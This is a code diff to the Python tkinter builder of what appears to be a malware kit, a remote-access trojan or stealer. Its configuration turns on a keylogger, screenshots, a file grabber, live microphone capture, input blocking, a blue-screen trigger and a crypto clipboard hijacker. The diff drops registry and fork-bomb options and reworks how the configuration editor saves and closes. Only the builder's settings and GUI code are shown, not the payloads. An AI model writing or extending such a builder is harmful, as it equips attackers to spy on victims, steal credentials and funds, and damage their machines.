@@ -39,7 +39,6 @@ class Builder:
             'functionalities': {
                 'keylogr': True,
                 'scrnsht': True,
-                'regstry': True,
                 'f_manag': True,
                 'grabber': True,
                 'mc_live': True,
@@ -51,7 +50,6 @@ class Builder:
                 'inputbl': True,
                 'bluesod': True,
                 'crclipr': True,
-                'forkbmb': True,
                 'messger': True,
                 'txtspee': True,
                 'audctrl': True,
@@ -219,10 +217,12 @@ class Builder:
         with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'r', encoding='utf-8') as configuration_file:
             self.malware_configuration = json.loads(''.join(configuration_file.readlines()))
     
-    def write_configuration(self):
-        with open('resources/assets/configuration.tmp', 'w', encoding='utf-8') as configuration_file:
+    def write_configuration(self, temporary=True, close=False):
+        with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'w', encoding='utf-8') as configuration_file:
             configuration_file.write(self.text.get('1.0', tk.END))
         self.malware_configuration = json.loads(self.text.get('1.0', tk.END))
+        if close != False:
+            close.destroy()
 
     def configuration_editor(self, file):
         cfg_editor = tk.Tk()
@@ -233,7 +233,7 @@ class Builder:
         frame.place(x=0, y=0, width=400, height=500)
 
         self.text = tk.Text(frame)
-        self.text.place(x=0, y=0, width=400, height=475)
+        self.text.place(x=0, y=0, width=400, height=462)
 
         with open(file, 'r', encoding='utf-8') as configuration_file:
             self.text.insert('1.0', ''.join(configuration_file.readlines()))
@@ -247,7 +247,7 @@ class Builder:
             text='Save',
             font=tkFont.Font(family='Consolas', size=5),
             disabledforeground='white',
-            command=self.write_configuration
+            command=lambda:self.write_configuration(True, cfg_editor)
         )
         btn_savecfg.place(x=399, y=499, anchor=tk.SE)
 
